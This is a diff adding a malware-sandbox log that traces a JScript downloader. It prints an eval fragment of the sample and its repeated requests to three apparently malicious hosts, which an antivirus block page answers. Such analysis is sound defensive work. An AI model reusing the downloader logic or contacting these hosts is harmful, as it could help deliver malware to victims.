@@ -1,0 +1,163 @@
+10 Sep 19:29:19 - mailware-jail, a malware sandbox ver. 0.15
+10 Sep 19:29:19 - ------------------------
+10 Sep 19:29:19 - Arguments: --down /home/maik/gitHub/TFM/fame/storage/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4.js
+10 Sep 19:29:19 - Sandbox environment sequence: fame/modules/community/processing/malware_jail/malware-jail/env/utils.js,fame/modules/community/processing/malware_jail/malware-jail/env/eval.js,fame/modules/community/processing/malware_jail/malware-jail/env/function.js,fame/modules/community/processing/malware_jail/malware-jail/env/wscript.js,fame/modules/community/processing/malware_jail/malware-jail/env/browser.js,fame/modules/community/processing/malware_jail/malware-jail/env/agents.js,fame/modules/community/processing/malware_jail/malware-jail/env/other.js,fame/modules/community/processing/malware_jail/malware-jail/env/console.js
+10 Sep 19:29:19 - Malware files: /home/maik/gitHub/TFM/fame/storage/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4.js
+10 Sep 19:29:19 - Execution timeout set to: 60 seconds
+10 Sep 19:29:19 - Output file for sandbox dump: fame/modules/community/processing/malware_jail/malware-jail/sandbox_dump_after.json
+10 Sep 19:29:19 - Output directory for generated files: fame/modules/community/processing/malware_jail/malware-jail/output/
+10 Sep 19:29:19 - Download from remote server: Yes
+10 Sep 19:29:19 - ==> Preparing Sandbox environment.
+10 Sep 19:29:19 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/utils.js quitely
+10 Sep 19:29:19 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/eval.js quitely
+10 Sep 19:29:19 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/function.js quitely
+10 Sep 19:29:19 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/wscript.js quitely
+10 Sep 19:29:19 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/browser.js quitely
+10 Sep 19:29:19 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/agents.js quitely
+10 Sep 19:29:19 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/other.js quitely
+10 Sep 19:29:19 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/console.js quitely
+10 Sep 19:29:19 - ==> Executing malware file(s). =========================================
+10 Sep 19:29:19 -  => Executing: /home/maik/gitHub/TFM/fame/storage/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4.js verbosely, reporting silent catches
+10 Sep 19:29:19 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/_home_maik_gitHub_TFM_fame_storage_c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4_c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4.js
+10 Sep 19:29:19 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/tr__home_maik_gitHub_TFM_fame_storage_c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4_c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4.js
+10 Sep 19:29:19 - WScript.scriptfullname = (string) '/home/maik/gitHub/TFM/fame/storage/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4.js'
+10 Sep 19:29:19 - WScript.arguments = (object) '/home/maik/gitHub/TFM/fame/storage/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4.js,xyz'
+10 Sep 19:29:19 - Calling eval[1]('var b = "kennedy.sitoserver.com nzvincent.com abama.org".split(" "); var ws = WScript.CreateObject("WScript.Shell"); var fn = ws.ExpandEnvironmentStrings("%TEMP%")+String.fromCharCode(92)+"799755"; var xo = WScript.CreateObject("MSXML2.XMLHTTP"); var ... (truncated)')
+10 Sep 19:29:19 - WScript.CreateObject(WScript.Shell)
+10 Sep 19:29:19 - new WScript.Shell[14]
+10 Sep 19:29:19 - WScript.Shell[14].ExpandEnvironmentStrings(%TEMP%) => C:\Users\User\AppData\Local\Temp
+10 Sep 19:29:19 - WScript.CreateObject(MSXML2.XMLHTTP)
+10 Sep 19:29:19 - new MSXML2.XMLHTTP[15]
+10 Sep 19:29:19 - MSXML2.XMLHTTP[15].onreadystatechange = (undefined) 'undefined'
+10 Sep 19:29:19 - WScript.CreateObject(ADODB.Stream)
+10 Sep 19:29:19 - new ADODB_Stream[16]
+10 Sep 19:29:19 - MSXML2.XMLHTTP[15].open(GET,http://kennedy.sitoserver.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090341,false)
+10 Sep 19:29:19 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+10 Sep 19:29:19 - MSXML2.XMLHTTP[15].url = (string) 'http://kennedy.sitoserver.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090341'
+10 Sep 19:29:19 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+10 Sep 19:29:19 - MSXML2.XMLHTTP[15].send(undefined)
+10 Sep 19:29:19 - MSXML2.XMLHTTP[15].method.get() => (string) 'GET'
+10 Sep 19:29:19 - MSXML2.XMLHTTP[15].url.get() => (string) 'http://kennedy.sitoserver.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090341'
+10 Sep 19:29:26 - MSXML2.XMLHTTP[15].status = (number) '499'
+10 Sep 19:29:26 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+10 Sep 19:29:26 - MSXML2.XMLHTTP[15].statustext = (string) 'OK'
+10 Sep 19:29:26 - MSXML2.XMLHTTP[15].responsebody = (object) '?<html dir="ltr">??<head>???<meta http-equiv='content-type' content='text/html;charset=utf-8'>???<title>Kaspersky Anti-Virus</title>??    <style type="text/css">??        html,body{height:100%}??        html[dir="rtl"] {??            direction:rtl;?? ... (truncated)'
+10 Sep 19:29:26 - MSXML2.XMLHTTP[15].allresponseheaders = (string) '{"content-type":"text/html; charset=utf-8","content-length":"2950"}'
+10 Sep 19:29:26 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+10 Sep 19:29:26 - MSXML2.XMLHTTP[15].status.get() => (number) '499'
+10 Sep 19:29:26 - MSXML2.XMLHTTP[15].open(GET,http://nzvincent.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090341,false)
+10 Sep 19:29:26 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+10 Sep 19:29:26 - MSXML2.XMLHTTP[15].url = (string) 'http://nzvincent.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090341'
+10 Sep 19:29:26 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+10 Sep 19:29:26 - MSXML2.XMLHTTP[15].send(undefined)
+10 Sep 19:29:26 - MSXML2.XMLHTTP[15].method.get() => (string) 'GET'
+10 Sep 19:29:26 - MSXML2.XMLHTTP[15].url.get() => (string) 'http://nzvincent.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090341'
+10 Sep 19:29:32 - MSXML2.XMLHTTP[15].status = (number) '499'
+10 Sep 19:29:32 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+10 Sep 19:29:32 - MSXML2.XMLHTTP[15].statustext = (string) 'OK'
+10 Sep 19:29:32 - MSXML2.XMLHTTP[15].responsebody = (object) '?<html dir="ltr">??<head>???<meta http-equiv='content-type' content='text/html;charset=utf-8'>???<title>Kaspersky Anti-Virus</title>??    <style type="text/css">??        html,body{height:100%}??        html[dir="rtl"] {??            direction:rtl;?? ... (truncated)'
+10 Sep 19:29:32 - MSXML2.XMLHTTP[15].allresponseheaders = (string) '{"content-type":"text/html; charset=utf-8","content-length":"2941"}'
+10 Sep 19:29:32 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+10 Sep 19:29:32 - MSXML2.XMLHTTP[15].status.get() => (number) '499'
+10 Sep 19:29:32 - MSXML2.XMLHTTP[15].open(GET,http://abama.org/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090341,false)
+10 Sep 19:29:32 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+10 Sep 19:29:32 - MSXML2.XMLHTTP[15].url = (string) 'http://abama.org/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090341'
+10 Sep 19:29:32 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+10 Sep 19:29:32 - MSXML2.XMLHTTP[15].send(undefined)
+10 Sep 19:29:32 - MSXML2.XMLHTTP[15].method.get() => (string) 'GET'
+10 Sep 19:29:32 - MSXML2.XMLHTTP[15].url.get() => (string) 'http://abama.org/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090341'
+10 Sep 19:29:39 - MSXML2.XMLHTTP[15].status = (number) '499'
+10 Sep 19:29:39 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+10 Sep 19:29:39 - MSXML2.XMLHTTP[15].statustext = (string) 'OK'
+10 Sep 19:29:39 - MSXML2.XMLHTTP[15].responsebody = (object) '?<html dir="ltr">??<head>???<meta http-equiv='content-type' content='text/html;charset=utf-8'>???<title>Kaspersky Anti-Virus</title>??    <style type="text/css">??        html,body{height:100%}??        html[dir="rtl"] {??            direction:rtl;?? ... (truncated)'
+10 Sep 19:29:39 - MSXML2.XMLHTTP[15].allresponseheaders = (string) '{"content-type":"text/html; charset=utf-8","content-length":"2937"}'
+10 Sep 19:29:39 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+10 Sep 19:29:39 - MSXML2.XMLHTTP[15].status.get() => (number) '499'
+10 Sep 19:29:39 - MSXML2.XMLHTTP[15].open(GET,http://kennedy.sitoserver.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090342,false)
+10 Sep 19:29:39 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+10 Sep 19:29:39 - MSXML2.XMLHTTP[15].url = (string) 'http://kennedy.sitoserver.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090342'
+10 Sep 19:29:39 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+10 Sep 19:29:39 - MSXML2.XMLHTTP[15].send(undefined)
+10 Sep 19:29:39 - MSXML2.XMLHTTP[15].method.get() => (string) 'GET'
+10 Sep 19:29:39 - MSXML2.XMLHTTP[15].url.get() => (string) 'http://kennedy.sitoserver.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090342'
+10 Sep 19:29:40 - MSXML2.XMLHTTP[15].status = (number) '499'
+10 Sep 19:29:40 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+10 Sep 19:29:40 - MSXML2.XMLHTTP[15].statustext = (string) 'OK'
+10 Sep 19:29:40 - MSXML2.XMLHTTP[15].responsebody = (object) '?<html dir="ltr">??<head>???<meta http-equiv='content-type' content='text/html;charset=utf-8'>???<title>Kaspersky Anti-Virus</title>??    <style type="text/css">??        html,body{height:100%}??        html[dir="rtl"] {??            direction:rtl;?? ... (truncated)'
+10 Sep 19:29:40 - MSXML2.XMLHTTP[15].allresponseheaders = (string) '{"content-type":"text/html; charset=utf-8","content-length":"2950"}'
+10 Sep 19:29:40 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+10 Sep 19:29:40 - MSXML2.XMLHTTP[15].status.get() => (number) '499'
+10 Sep 19:29:40 - MSXML2.XMLHTTP[15].open(GET,http://nzvincent.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090342,false)
+10 Sep 19:29:40 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+10 Sep 19:29:40 - MSXML2.XMLHTTP[15].url = (string) 'http://nzvincent.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090342'
+10 Sep 19:29:40 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+10 Sep 19:29:40 - MSXML2.XMLHTTP[15].send(undefined)
+10 Sep 19:29:40 - MSXML2.XMLHTTP[15].method.get() => (string) 'GET'
+10 Sep 19:29:40 - MSXML2.XMLHTTP[15].url.get() => (string) 'http://nzvincent.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090342'
+10 Sep 19:29:42 - MSXML2.XMLHTTP[15].status = (number) '499'
+10 Sep 19:29:42 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+10 Sep 19:29:42 - MSXML2.XMLHTTP[15].statustext = (string) 'OK'
+10 Sep 19:29:42 - MSXML2.XMLHTTP[15].responsebody = (object) '?<html dir="ltr">??<head>???<meta http-equiv='content-type' content='text/html;charset=utf-8'>???<title>Kaspersky Anti-Virus</title>??    <style type="text/css">??        html,body{height:100%}??        html[dir="rtl"] {??            direction:rtl;?? ... (truncated)'
+10 Sep 19:29:42 - MSXML2.XMLHTTP[15].allresponseheaders = (string) '{"content-type":"text/html; charset=utf-8","content-length":"2941"}'
+10 Sep 19:29:42 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+10 Sep 19:29:42 - MSXML2.XMLHTTP[15].status.get() => (number) '499'
+10 Sep 19:29:42 - MSXML2.XMLHTTP[15].open(GET,http://abama.org/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090342,false)
+10 Sep 19:29:42 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+10 Sep 19:29:42 - MSXML2.XMLHTTP[15].url = (string) 'http://abama.org/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090342'
+10 Sep 19:29:42 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+10 Sep 19:29:42 - MSXML2.XMLHTTP[15].send(undefined)
+10 Sep 19:29:42 - MSXML2.XMLHTTP[15].method.get() => (string) 'GET'
+10 Sep 19:29:42 - MSXML2.XMLHTTP[15].url.get() => (string) 'http://abama.org/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090342'
+10 Sep 19:29:52 - MSXML2.XMLHTTP[15].status = (number) '499'
+10 Sep 19:29:52 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+10 Sep 19:29:52 - MSXML2.XMLHTTP[15].statustext = (string) 'OK'
+10 Sep 19:29:52 - MSXML2.XMLHTTP[15].responsebody = (object) '?<html dir="ltr">??<head>???<meta http-equiv='content-type' content='text/html;charset=utf-8'>???<title>Kaspersky Anti-Virus</title>??    <style type="text/css">??        html,body{height:100%}??        html[dir="rtl"] {??            direction:rtl;?? ... (truncated)'
+10 Sep 19:29:52 - MSXML2.XMLHTTP[15].allresponseheaders = (string) '{"content-type":"text/html; charset=utf-8","content-length":"2937"}'
+10 Sep 19:29:52 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+10 Sep 19:29:52 - MSXML2.XMLHTTP[15].status.get() => (number) '499'
+10 Sep 19:29:52 - MSXML2.XMLHTTP[15].open(GET,http://kennedy.sitoserver.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090343,false)
+10 Sep 19:29:52 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+10 Sep 19:29:52 - MSXML2.XMLHTTP[15].url = (string) 'http://kennedy.sitoserver.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090343'
+10 Sep 19:29:52 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+10 Sep 19:29:52 - MSXML2.XMLHTTP[15].send(undefined)
+10 Sep 19:29:52 - MSXML2.XMLHTTP[15].method.get() => (string) 'GET'
+10 Sep 19:29:52 - MSXML2.XMLHTTP[15].url.get() => (string) 'http://kennedy.sitoserver.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090343'
+10 Sep 19:29:58 - MSXML2.XMLHTTP[15].status = (number) '499'
+10 Sep 19:29:58 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+10 Sep 19:29:58 - MSXML2.XMLHTTP[15].statustext = (string) 'OK'
+10 Sep 19:29:58 - MSXML2.XMLHTTP[15].responsebody = (object) '?<html dir="ltr">??<head>???<meta http-equiv='content-type' content='text/html;charset=utf-8'>???<title>Kaspersky Anti-Virus</title>??    <style type="text/css">??        html,body{height:100%}??        html[dir="rtl"] {??            direction:rtl;?? ... (truncated)'
+10 Sep 19:29:58 - MSXML2.XMLHTTP[15].allresponseheaders = (string) '{"content-type":"text/html; charset=utf-8","content-length":"2950"}'
+10 Sep 19:29:58 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+10 Sep 19:29:58 - MSXML2.XMLHTTP[15].status.get() => (number) '499'
+10 Sep 19:29:58 - MSXML2.XMLHTTP[15].open(GET,http://nzvincent.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090343,false)
+10 Sep 19:29:58 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+10 Sep 19:29:58 - MSXML2.XMLHTTP[15].url = (string) 'http://nzvincent.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090343'
+10 Sep 19:29:58 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+10 Sep 19:29:58 - MSXML2.XMLHTTP[15].send(undefined)
+10 Sep 19:29:58 - MSXML2.XMLHTTP[15].method.get() => (string) 'GET'
+10 Sep 19:29:58 - MSXML2.XMLHTTP[15].url.get() => (string) 'http://nzvincent.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090343'
+10 Sep 19:30:05 - MSXML2.XMLHTTP[15].status = (number) '499'
+10 Sep 19:30:05 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+10 Sep 19:30:05 - MSXML2.XMLHTTP[15].statustext = (string) 'OK'
+10 Sep 19:30:05 - MSXML2.XMLHTTP[15].responsebody = (object) '?<html dir="ltr">??<head>???<meta http-equiv='content-type' content='text/html;charset=utf-8'>???<title>Kaspersky Anti-Virus</title>??    <style type="text/css">??        html,body{height:100%}??        html[dir="rtl"] {??            direction:rtl;?? ... (truncated)'
+10 Sep 19:30:05 - MSXML2.XMLHTTP[15].allresponseheaders = (string) '{"content-type":"text/html; charset=utf-8","content-length":"2941"}'
+10 Sep 19:30:05 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+10 Sep 19:30:05 - MSXML2.XMLHTTP[15].status.get() => (number) '499'
+10 Sep 19:30:05 - MSXML2.XMLHTTP[15].open(GET,http://abama.org/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090343,false)
+10 Sep 19:30:05 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+10 Sep 19:30:05 - MSXML2.XMLHTTP[15].url = (string) 'http://abama.org/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090343'
+10 Sep 19:30:05 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+10 Sep 19:30:05 - MSXML2.XMLHTTP[15].send(undefined)
+10 Sep 19:30:05 - MSXML2.XMLHTTP[15].method.get() => (string) 'GET'
+10 Sep 19:30:05 - MSXML2.XMLHTTP[15].url.get() => (string) 'http://abama.org/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090343'
+10 Sep 19:30:11 - MSXML2.XMLHTTP[15].status = (number) '499'
+10 Sep 19:30:11 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+10 Sep 19:30:11 - MSXML2.XMLHTTP[15].statustext = (string) 'OK'
+10 Sep 19:30:11 - MSXML2.XMLHTTP[15].responsebody = (object) '?<html dir="ltr">??<head>???<meta http-equiv='content-type' content='text/html;charset=utf-8'>???<title>Kaspersky Anti-Virus</title>??    <style type="text/css">??        html,body{height:100%}??        html[dir="rtl"] {??            direction:rtl;?? ... (truncated)'
+10 Sep 19:30:11 - MSXML2.XMLHTTP[15].allresponseheaders = (string) '{"content-type":"text/html; charset=utf-8","content-length":"2937"}'
+10 Sep 19:30:11 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+10 Sep 19:30:11 - MSXML2.XMLHTTP[15].status.get() => (number) '499'
+10 Sep 19:30:11 - ==> Cleaning up sandbox.
+10 Sep 19:30:11 - ==> Script execution finished, dumping sandbox environment to a file.
+10 Sep 19:30:11 - The sandbox context has been  saved to: fame/modules/community/processing/malware_jail/malware-jail/sandbox_dump_after.json
+10 Sep 19:30:11 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/eval1.js
